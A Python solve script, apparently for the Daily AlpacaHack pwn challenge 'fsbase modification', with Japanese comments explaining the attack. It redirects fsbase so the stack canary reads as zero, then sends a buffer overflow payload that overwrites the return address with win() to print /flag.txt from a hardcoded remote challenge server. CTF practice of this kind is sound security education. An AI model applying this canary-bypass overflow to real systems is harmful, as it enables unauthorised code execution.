#!/usr/bin/env python3
# =============================================================================
# fsbase modification - Daily AlpacaHack
# カテゴリー: Pwn | トピック: x86 | 難易度: Hard 8.0
# =============================================================================
# 【概要】
# 配布バイナリ chal には、スタックバッファオーバーフローの脆弱性があります。
# ただし Stack Canary（スタックカナリア）が有効なので、ふつうに戻りアドレスを
# 書き換えると「*** stack smashing detected ***」で強制終了してしまいます。
#
# この問題のポイントは、vuln() が呼ばれる前に main() が arch_prctl(ARCH_SET_FS)
# で「fsbase（FS セグメントのベースアドレス）」を任意の値に変更させてくれること
# です。カナリアは fs:0x28 （= fsbase + 0x28）から読み出されるので、fsbase を
# こちらが中身を知っているメモリへ向ければ、カナリアの値を「知る」ことができます。
#
#   fsbase = 0x404000 を指定すると…
#     カナリア読み出し位置 fs:0x28 = 0x404000 + 0x28 = 0x404028
#     0x404028 はプログラムの .data 領域の先頭（__data_start）で、中身は 0。
#   → カナリアは 0 だと確定する！
#
# あとは普通のスタックオーバーフローで
#     [buf 8 バイト] [カナリア=0] [保存された rbp] [戻りアドレス=win]
# という配置でカナリアに 0 を置けば、カナリアチェックを通過して win() へ飛べます。
# win() は execve("/bin/cat", ["/bin/cat", "/flag.txt"], NULL) を実行するので、
# サーバー上の /flag.txt が表示されます。
#
# （Colab ノートブックと同じ方針・同じ値です。標準ライブラリ socket と struct
#   だけを使い、1) fsbase=0x404000 を送信 → 2) 'A'*8 + p64(0) + p64(0) + p64(win)
#   というペイロードを送信、という 2 段構えで攻撃します。）
#
# 【準備】
#   追加ライブラリは不要です（socket, struct はともに Python 標準ライブラリ）。
#   配布ファイルはリポジトリに含めていません。問題ページから各自ダウンロードして
#   ください（ローカル検証をしたい場合のみ）。
#
# 【使い方】
#   python3 solve.py                      # 既定の接続先（リモート）へ攻撃
#   python3 solve.py <host> <port>        # 接続先を指定（ローカル検証などに）
#
# ※ フラグはこのファイルには書かれていません。実行時にサーバーから受信して表示します。
# =============================================================================

import socket   # TCP 接続用（Python 標準ライブラリ）
import struct   # 数値を 64bit リトルエンディアンのバイト列へ変換するため
import sys      # コマンドライン引数の取得用

# =============================================================================
# 定数: 攻撃に使うアドレスと接続先
# =============================================================================
# win() のアドレス。no-PIE（位置独立でない）バイナリなので毎回このアドレスに
# 固定されています。`objdump -d chal | grep "<win>"` で確認できます。
WIN_ADDR = 0x4011B6

# 設定する fsbase。0x404000 は書き込み可能なデータ領域内のアドレスで、
# ここを基準にすると カナリア位置 fs:0x28 = 0x404028（.data、値は 0）になります。
# 10 進では 4210688。strtoul(..., 10) で読まれるため 10 進文字列で送ります。
FSBASE = 0x404000

# 既定の接続先（Daily AlpacaHack の共有リモートサーバー）。
HOST = "34.170.146.252"
PORT = 37571

# コマンドライン引数で接続先を上書きできるようにしておきます（ローカル検証用）。
if len(sys.argv) >= 3:
    HOST, PORT = sys.argv[1], int(sys.argv[2])


def recv_until(sock, marker, timeout=5.0):
    """marker（バイト列）が現れるまで受信して、受け取った全バイトを返す補助関数。

    サーバーのプロンプト（例: b"message> "）を待ってから次の入力を送ることで、
    main() の read() が『fsbase の行』だけを読み、ペイロードを食べてしまわない
    ように同期させるのが狙いです（この同期が今回の攻撃では特に重要です）。
    """
    sock.settimeout(timeout)
    buf = b""
    while marker not in buf:
        chunk = sock.recv(4096)
        if not chunk:          # 接続が閉じられたら終了
            break
        buf += chunk
    return buf


def main():
    # -------------------------------------------------------------------------
    # Step 0: サーバーへ接続
    # -------------------------------------------------------------------------
    print(f"[*] connecting to {HOST}:{PORT}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # -------------------------------------------------------------------------
    # Step 1: fsbase を送信する
    # -------------------------------------------------------------------------
    # main() はまず "fsbase(-1 for testing a default vuln behavior): " を表示し、
    # 1 行（最大 31 バイト）を読んで strtoul() で整数に変換し、
    # arch_prctl(ARCH_SET_FS, fsbase) で FS ベースを書き換えます。
    # ここで 0x404000（= 4210688）を渡すと、以降 fs:0x28 は 0x404028（.data=0）に
    # なり、カナリアが 0 に固定されます。
    print("[<]", recv_until(s, b"behavior): ").decode("utf-8", "ignore").strip())
    print(f"[>] fsbase = {FSBASE:#x} ({FSBASE})")
    s.sendall(str(FSBASE).encode() + b"\n")

    # -------------------------------------------------------------------------
    # Step 2: ペイロードを送信する
    # -------------------------------------------------------------------------
    # vuln() は "Please leave a message> " を表示してから read(buf, 32) を行います。
    # buf は 8 バイトしかないのに 32 バイト読むため、以下のように溢れさせます。
    #
    #   オフセット  内容
    #   +0x00       'A' * 8          … buf[8] を埋める
    #   +0x08       p64(0)           … カナリア（fs:0x28 = 0 なので 0 を置く）
    #   +0x10       p64(0)           … 保存された rbp（何でもよいので 0）
    #   +0x18       p64(WIN_ADDR)    … 戻りアドレスを win() に書き換える
    #
    # 先に Step 1 の応答（message> プロンプト）を待つことで、main() の read() が
    # このペイロードを先読みしてしまう事故を防ぎます。
    print("[<]", recv_until(s, b"message> ").decode("utf-8", "ignore").strip())
    payload  = b"A" * 8                      # buf[8] を埋める
    payload += struct.pack("<Q", 0)          # カナリア = 0（fsbase 改変で既知にした値）
    payload += struct.pack("<Q", 0)          # 保存された rbp（ダミー）
    payload += struct.pack("<Q", WIN_ADDR)   # 戻りアドレス → win()
    print(f"[>] payload ({len(payload)} bytes): canary=0, ret={WIN_ADDR:#x} (win)")
    s.sendall(payload)

    # -------------------------------------------------------------------------
    # Step 3: 応答（フラグ）を受信して表示する
    # -------------------------------------------------------------------------
    # win() が execve("/bin/cat", ["/bin/cat", "/flag.txt"], NULL) を実行するので、
    # サーバー上の /flag.txt の中身（= フラグ）が返ってきます。
    s.settimeout(5.0)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    s.close()

    text = data.decode("utf-8", "ignore").strip()
    print("[<] response:")
    print(text if text else "(no data received)")
    if "Alpaca{" in text:
        print("[+] flag received (フラグを取得しました)")


if __name__ == "__main__":
    main()
